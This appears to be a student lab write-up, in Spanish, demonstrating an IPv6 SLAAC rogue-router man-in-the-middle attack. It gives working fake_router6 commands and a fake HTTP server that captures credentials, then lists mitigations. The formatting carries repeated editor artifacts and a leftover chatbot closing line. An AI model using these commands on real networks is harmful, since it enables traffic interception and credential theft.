# PoC: Ataque SLAAC (IPv6 Rogue Router)

**Autor:** Pablo Arenas
**Asignatura:** Hacking Ético / Seguridad en Redes
**Fecha:** Diciembre 2025

---

## 1. Descripción del Proyecto
Este proyecto demuestra una **Prueba de Concepto (PoC)** sobre la vulnerabilidad **SLAAC (Stateless Address Autoconfiguration)** en redes IPv6. 

El ataque consiste en introducir un **"Rogue Router"** (Router falso) en la red que envía paquetes *Router Advertisement* (RA) maliciosos. Esto provoca que los dispositivos víctimas se autoconfiguren automáticamente con una dirección IPv6 y una puerta de enlace controlada por el atacante, permitiendo un ataque **Man-in-the-Middle (MITM)** y la intercepción de tráfico.

## 2. Entorno y Herramientas

* **Máquina Atacante:** Kali Linux
    * `thc-ipv6` (Herramienta `atk6-fake_router6`)
    * `python3` (Módulo `http.server`)
    * `Wireshark`
* **Máquina Víctima:** Ubuntu 22.04
* **Red:** Configuración de red local (LAN) compartida.

---

## 3. Procedimiento del Ataque

### Paso 1: Preparación del Atacante
Primero, instalamos las herramientas necesarias en Kali Linux y nos asignamos una IP estática dentro del rango malicioso que vamos a inyectar (`2001:1234::/64`) para actuar como gateway.

```bash
# 1. Instalación de la suite thc-ipv6
sudo apt update && sudo apt install thc-ipv6

# 2. Asignación manual de la IP del router falso
sudo ip -6 addr add 2001:1234::1/64 dev eth0
```bash

### Paso 2: Despliegue del Rogue Router
Lanzamos el ataque de inundación de paquetes RA. Esto hace que todos los equipos de la red acepten nuestro prefijo `2001:1234::` y nos configuren como su router IPv6 por defecto.


# Comando para iniciar el anuncio de router falso
sudo atk6-fake_router6 eth0 2001:1234::/64

### Paso 2: Despliegue del Rogue Router

Se inicia el envío de anuncios de router (RA) maliciosos, provocando que los equipos de la red acepten el prefijo falso y configuren al atacante como gateway IPv6 por defecto.

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   # Inicio del ataque de Rogue Router  sudo atk6-fake_router6 eth0 2001:1234::/64   `

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   # Evidencia 1  # Terminal de Kali ejecutando el ataque fake_router6   `

### Paso 3: Verificación en la Víctima (Compromiso)

En la máquina víctima se comprueba la configuración de red y se observa la asignación automática de una dirección IPv6 perteneciente al prefijo malicioso.

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   # Comprobación de la configuración de red en la víctima  ip a   `

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   # Salida observada  inet6 2001:1234:abcd:abcd::1234/64 scope global dynamic   `

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   # Evidencia 2  # La máquina víctima ha sido configurada mediante SLAAC con el prefijo inyectado   `

4\. Prueba de Concepto: Captura de Credenciales
-----------------------------------------------

### Paso 4.1: Preparación del Servidor Falso (Atacante)

Se levanta un servidor web simple en la máquina atacante, escuchando en la dirección IPv6 maliciosa.

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   # Inicio del servidor web falso en IPv6  sudo python3 -m http.server 80 --bind 2001:1234::1   `

### Paso 4.2: Simulación de la Víctima

La víctima realiza una petición HTTP enviando credenciales en la URL, simulando un acceso a un servicio interno.

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   # Petición HTTP desde la máquina víctima  wget "http://[2001:1234::1]/login?usuario=admin&pass=capturado"   `

### Paso 4.3: Resultado de la Captura

El servidor del atacante recibe la petición HTTP completa, quedando las credenciales registradas en texto plano.

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   # Evidencia 3 - Log del servidor Python  GET /login?usuario=admin&pass=capturado HTTP/1.1   `

El tráfico también puede observarse claramente mediante análisis de paquetes.

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   # Evidencia 4  # Captura de tráfico IPv6 HTTP visualizada en Wireshark   `

5\. Mitigación y Soluciones
---------------------------

Para proteger una infraestructura frente a ataques **Rogue Router IPv6 / SLAAC**, se recomiendan las siguientes medidas:

*   **RA Guard:** Bloquear mensajes RA (ICMPv6 tipo 134) desde puertos no autorizados en switches de capa 2.
    
*   **Desactivar IPv6:** En entornos donde no sea necesario, deshabilitar IPv6 en clientes y servidores.
    
*   **Listas de Control de Acceso (ACL):** Permitir tráfico IPv6 solo desde routers legítimos conocidos.
    
*   **Uso de HTTPS y VPN:** El cifrado protege las credenciales incluso en presencia de ataques MITM.
    

6\. Aviso Legal
---------------

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   # Esta práctica ha sido realizada únicamente con fines académicos y educativos.  # El uso de estas técnicas en redes reales sin autorización es ilegal.   `

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML``   ---  Si quieres, en el siguiente paso puedo:  - Añadir **estructura de carpetas del repo** (`/captures`, `/images`, `/docs`)  - Ajustarlo al **formato típico de memoria de prácticas**  - Reducirlo a versión **portfolio / GitHub profesional** para ciberseguridad  Tú mandas 🔐💻   ``
